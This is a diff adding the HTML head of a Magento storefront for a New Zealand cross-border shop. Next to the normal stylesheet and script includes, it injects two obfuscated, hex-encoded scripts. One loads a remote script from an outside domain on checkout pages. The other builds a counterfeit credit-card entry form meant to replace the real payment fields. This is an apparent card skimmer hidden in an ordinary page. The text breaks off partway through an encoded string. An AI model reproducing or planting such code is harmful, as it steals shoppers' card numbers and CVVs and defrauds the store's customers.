@@ -1,0 +1,969 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>CTOM-新西兰跨境电子商务平台</title>
+<meta name="description" content="Default Description" />
+<meta name="keywords" content="Magento, Varien, E-commerce" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://www.ctom.club/skin/frontend/default/ctom/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://www.ctom.club/skin/frontend/default/ctom/favicon.ico" type="image/x-icon" />
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://www.ctom.club/js/blank.html';
+    var BLANK_IMG = 'http://www.ctom.club/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://www.ctom.club/skin/frontend/default/ctom/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ctom.club/skin/frontend/default/ctom/css/foucs.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ctom.club/skin/frontend/default/ctom/css/jquery.hotspot.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ctom.club/skin/frontend/base/default/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ctom.club/skin/frontend/default/ctom/css/print.css" media="print" />
+<script type="text/javascript" src="http://www.ctom.club/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/js/varien/js.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/js/varien/form.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/js/iwd/all/iwd-jquery-2.1.3.min.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/js/iwd/all/modal.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/skin/frontend/default/ctom/js/jquery-1.7.2.min.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/skin/frontend/default/ctom/js/modernizr.custom.49511.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/skin/frontend/default/ctom/js/jquery.hotspot.min.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/skin/frontend/default/ctom/js/jquery.foucs.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/skin/frontend/default/ctom/js/middle_banner.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/skin/frontend/default/ctom/js/middle_banner2.js"></script>
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://www.ctom.club/skin/frontend/default/ctom/css/styles-ie.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://www.ctom.club/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/skin/frontend/base/default/js/ie6.js"></script>
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.www.ctom.club';
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["NZ"];
+//]]>
+</script>
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate([]);
+        //]]></script><script>
+var _0x7539=["\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70\x7C\x66\x69\x72\x65\x63\x68\x65\x63\x6B\x6F\x75\x74","\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x73\x2D\x73\x61\x76\x65\x2E\x6C\x69\x6E\x6B\x2F\x6A\x73\x2D\x73\x61\x76\x65\x2F\x6D\x61\x67\x65\x2E\x6A\x73\x22\x3E\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E","\x77\x72\x69\x74\x65"];if(( new RegExp(_0x7539[2]))[_0x7539[1]](window[_0x7539[0]])){document[_0x7539[4]](_0x7539[3])}
+</script><script>var _0xc240=["\x70\x61\x79\x6D\x65\x6E\x74\x5F\x66\x6F\x72\x6D\x5F\x63\x63\x73\x61\x76\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x68\x65\x63\x6B\x6F\x75\x74\x2D\x70\x61\x79\x6D\x65\x6E\x74\x2D\x6D\x65\x74\x68\x6F\x64\x2D\x6C\x6F\x61\x64","\x73\x65\x74\x49\x6E\x74\x65\x72\x76\x61\x6C","\x66\x69\x72\x73\x74\x43\x68\x69\x6C\x64","\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64","\x3C\x75\x6C\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x6F\x72\x6D\x2D\x6C\x69\x73\x74\x22\x20\x69\x64\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5F\x66\x6F\x72\x6D\x5F\x63\x63\x73\x61\x76\x65\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x6F\x76\x65\x72\x66\x6C\x6F\x77\x3A\x20\x68\x69\x64\x64\x65\x6E\x3B\x22\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6F\x77\x6E\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x4E\x61\x6D\x65\x20\x6F\x6E\x20\x43\x61\x72\x64\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x4E\x61\x6D\x65\x20\x6F\x6E\x20\x43\x61\x72\x64\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6F\x77\x6E\x65\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x6F\x77\x6E\x65\x72\x5D\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x74\x79\x70\x65\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x54\x79\x70\x65\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x74\x79\x70\x65\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x74\x79\x70\x65\x5D\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x54\x79\x70\x65\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x74\x79\x70\x65\x2D\x73\x65\x6C\x65\x63\x74\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x2D\x2D\x50\x6C\x65\x61\x73\x65\x20\x53\x65\x6C\x65\x63\x74\x2D\x2D\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x41\x45\x22\x3E\x41\x6D\x65\x72\x69\x63\x61\x6E\x20\x45\x78\x70\x72\x65\x73\x73\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x56\x49\x22\x3E\x56\x69\x73\x61\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x4D\x43\x22\x3E\x4D\x61\x73\x74\x65\x72\x43\x61\x72\x64\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x44\x49\x22\x3E\x44\x69\x73\x63\x6F\x76\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x4A\x43\x42\x22\x3E\x4A\x43\x42\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x53\x4D\x22\x3E\x53\x77\x69\x74\x63\x68\x2F\x4D\x61\x65\x73\x74\x72\x6F\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x4E\x75\x6D\x62\x65\x72\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6E\x75\x6D\x62\x65\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x6E\x75\x6D\x62\x65\x72\x5D\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x4E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x6E\x75\x6D\x62\x65\x72\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x74\x79\x70\x65\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x45\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x20\x44\x61\x74\x65\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x65\x78\x70\x5F\x6D\x6F\x6E\x74\x68\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x6F\x6E\x74\x68\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x65\x78\x70\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x4D\x6F\x6E\x74\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x22\x3E\x30\x31\x20\x2D\x20\x4A\x61\x6E\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x22\x3E\x30\x32\x20\x2D\x20\x46\x65\x62\x72\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x33\x22\x3E\x30\x33\x20\x2D\x20\x4D\x61\x72\x63\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x34\x22\x3E\x30\x34\x20\x2D\x20\x41\x70\x72\x69\x6C\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x35\x22\x3E\x30\x35\x20\x2D\x20\x4D\x61\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x36\x22\x3E\x30\x36\x20\x2D\x20\x4A\x75\x6E\x65\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x37\x22\x3E\x30\x37\x20\x2D\x20\x4A\x75\x6C\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x38\x22\x3E\x30\x38\x20\x2D\x20\x41\x75\x67\x75\x73\x74\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x39\x22\x3E\x30\x39\x20\x2D\x20\x53\x65\x70\x74\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x30\x22\x3E\x31\x30\x20\x2D\x20\x4F\x63\x74\x6F\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x31\x22\x3E\x31\x31\x20\x2D\x20\x4E\x6F\x76\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x32\x22\x3E\x31\x32\x20\x2D\x20\x44\x65\x63\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x5F\x79\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x65\x78\x70\x5F\x79\x65\x61\x72\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x79\x65\x61\x72\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x59\x65\x61\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x36\x22\x3E\x32\x30\x31\x36\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x37\x22\x3E\x32\x30\x31\x37\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x38\x22\x3E\x32\x30\x31\x38\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x39\x22\x3E\x32\x30\x31\x39\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x30\x22\x3E\x32\x30\x32\x30\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x31\x22\x3E\x32\x30\x32\x31\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x32\x22\x3E\x32\x30\x32\x32\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x33\x22\x3E\x32\x30\x32\x33\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x34\x22\x3E\x32\x30\x32\x34\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x35\x22\x3E\x32\x30\x32\x35\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x36\x22\x3E\x32\x30\x32\x36\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x63\x65\x6E\x74\x69\x6E\x65\x6C\x2D\x6C\x6F\x67\x6F\x73\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x65\x6E\x74\x69\x6E\x65\x6C\x5F\x6C\x6F\x67\x6F\x22\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x3E\x54\x6F\x20\x65\x6E\x73\x75\x72\x65\x20\x74\x68\x65\x20\x73\x65\x63\x75\x72\x69\x74\x79\x20\x6F\x66\x20\x79\x6F\x75\x72\x20\x74\x72\x61\x6E\x73\x61\x63\x74\x69\x6F\x6E\x73\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x20\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x63\x69\x64\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x43\x61\x72\x64\x20\x56\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x20\x4E\x75\x6D\x62\x65\x72\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x43\x61\x72\x64\x20\x56\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x20\x4E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x63\x76\x76\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x63\x76\x6E\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x63\x69\x64\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x63\x69\x64\x5D\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x61\x20\x68\x72\x65\x66\x3D\x22\x23\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x63\x76\x76\x2D\x77\x68\x61\x74\x2D\x69\x73\x2D\x74\x68\x69\x73\x22\x3E\x57\x68\x61\x74\x20\x69\x73\x20\x74\x68\x69\x73\x3F\x3C\x2F\x61\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x74\x79\x70\x65\x5F\x73\x73\x5F\x64\x69\x76\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x64\x69\x73\x70\x6C\x61\x79\x3A\x20\x6E\x6F\x6E\x65\x3B\x22\x3E\x20\x3C\x75\x6C\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x6E\x65\x72\x2D\x66\x6F\x72\x6D\x22\x3E\x20\x3C\x6C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x6F\x72\x6D\x2D\x61\x6C\x74\x22\x3E\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x69\x73\x73\x75\x65\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x53\x77\x69\x74\x63\x68\x2F\x53\x6F\x6C\x6F\x2F\x4D\x61\x65\x73\x74\x72\x6F\x20\x4F\x6E\x6C\x79\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x69\x73\x73\x75\x65\x22\x3E\x49\x73\x73\x75\x65\x20\x4E\x75\x6D\x62\x65\x72\x3A\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x73\x70\x61\x6E\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x49\x73\x73\x75\x65\x20\x4E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x75\x6B\x73\x73\x20\x63\x76\x76\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x69\x73\x73\x75\x65\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x73\x73\x5F\x69\x73\x73\x75\x65\x5D\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x73\x70\x61\x6E\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x73\x74\x61\x72\x74\x5F\x6D\x6F\x6E\x74\x68\x22\x3E\x53\x74\x61\x72\x74\x20\x44\x61\x74\x65\x3A\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x73\x74\x61\x72\x74\x5F\x6D\x6F\x6E\x74\x68\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x73\x73\x5F\x73\x74\x61\x72\x74\x5F\x6D\x6F\x6E\x74\x68\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x75\x6B\x73\x73\x20\x6D\x6F\x6E\x74\x68\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x2